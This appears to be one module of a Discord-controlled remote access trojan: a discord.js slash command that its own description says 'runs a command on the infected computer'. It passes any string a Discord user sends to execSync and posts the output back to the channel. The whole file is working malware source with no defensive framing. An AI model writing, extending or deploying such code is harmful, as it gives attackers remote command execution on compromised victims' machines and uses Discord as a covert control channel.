const { SlashCommandBuilder, AttachmentBuilder } = require('discord.js');
const { execSync } = require('child_process');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('run')
    .setDescription('Runs a command on the infected computer')
    .addStringOption(option => option
      .setName('command')
      .setDescription('The command to run')
      .setRequired(true)
    )
    .setDMPermission(false),

  async run(interaction, client, args) {
    const slash = !!interaction.options;
    if (slash) await interaction.deferReply();

    try {
      const commandString = !slash ? args.join(' ') : args.getString('command');
      const command = await execSync(commandString);

      if (command && command.length > 0 && command.length < 2000) {
        await interaction[!slash ? 'reply' : 'editReply']({
          content: `\`\`\`${command.toString().trim()}\`\`\``
        });
      } else if (command && command.length >= 2000) {
        await interaction[!slash ? 'reply' : 'editReply']({
          files: [
            new AttachmentBuilder(command, { name: 'output.txt' })
          ]
        });
      } else {
        !slash ? await interaction.react('✅') : await interaction.editReply({ content: '✅' });
      }
    } catch (e) {
      await interaction[!slash ? 'reply' : 'editReply']({
        content: `\`\`\`${e.message}\`\`\``, ephemeral: true
      });
    }
  }
}
